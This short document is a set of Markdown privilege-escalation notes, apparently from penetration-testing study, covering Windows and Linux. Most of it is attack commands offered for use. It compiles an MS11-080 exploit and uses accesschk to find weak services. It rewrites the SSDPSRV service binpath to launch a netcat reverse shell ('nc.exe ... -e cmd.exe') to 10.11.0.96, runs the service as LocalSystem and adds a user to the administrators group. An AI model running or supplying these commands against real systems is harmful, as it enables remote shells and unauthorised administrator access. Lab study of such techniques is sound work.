# Windows
## Build exe from Python on Windows
~~~
python pyinstaller.py --onefile ms11-080.py
~~~

## Search misconfiguration files




## Access control check
  - accesschk
    - XP
      ~~~
      accesschk-XP.exe /accepteula -uwcqv <user> * > ack.txt
       > Process
      accesschk-XP.exe /accepteula -ucqv SSDPSRV
       > User
      ~~~

  - sc
    - Info
      ~~~
      sc qc SSDPSRV
      ~~~
    - Configuration
      ~~~
      sc config <Process> binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.96 9090 -e cmd.exe"
        #ex)sc config SSDPSRV binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.96 9090 -e cmd.exe"
      sc config <Process> obj= ".\LocalSystem" password= ""
        #ex)sc config SSDPSRV obj= ".\LocalSystem" password= ""
      sc config <Process> start= "demand"
        #ex)sc config SSDPSRV start= "demand"
      net start <Process>
        #ex)net start SSDPSRV
          net localgroup administrators <user> /add
      ~~~

    - File search
      - Disk check
        ~~~
        echo list volume | diskpart
        ~~~

# Linux
## Search interesting priviledge files
  ~~~
  find / -perm 2 ! -type l -ls 2>/dev/null
  ~~~


